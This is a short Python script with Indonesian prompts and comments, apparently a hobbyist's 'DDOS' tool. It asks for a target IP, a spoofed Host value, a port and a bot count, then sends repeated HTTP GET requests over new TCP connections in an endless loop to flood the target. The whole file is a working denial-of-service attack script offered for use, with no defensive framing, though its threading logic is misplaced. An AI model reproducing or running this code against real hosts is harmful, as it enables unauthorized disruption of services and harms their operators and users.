import socket
import threading
from termcolor import colored
from pyfiglet import figlet_format

print((colored(figlet_format("DDOS", font="future_1"), color="red")))
print((colored("-------------------- Coded by Dzaki Althalsyah -------------------- \n", color="blue")))
print((colored("Github: https://github.com/dzakialthalsyah/   ||   Instagram: https://instagram.com/dzakialthalsyah/ \n\n\n", color="cyan")))


target = input("masukkan ip target: ")
ip_palsu = input("\n\nmasukkan ip palsu: ")
port = int(input("""\n\npilih port 
80 atau 443: """))
jumlah_bot = int(input("""\n\ndefault = 100
masukkan jumlah bot: """))

jumlah_attack = 0

# membuat function untuk attack
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        # (self), (data), (target)   ,data perlu di encode kedalam bytes agar dapat diterima server
        s.sendto(("Host: " + ip_palsu + "\r\n\r\n").encode("ascii"), (target, port))
        # (self), (data), (target)   ,data perlu di encode kedalam bytes agar dapat diterima server
        s.close()

        global jumlah_attack
        global jumlah_bot
        jumlah_attack += 1
        print("\n\n\njumlah attack: ", jumlah_attack)

    for i in range(jumlah_bot):
        thread = threading.Thread(target=attack)
        thread.start()

attack()

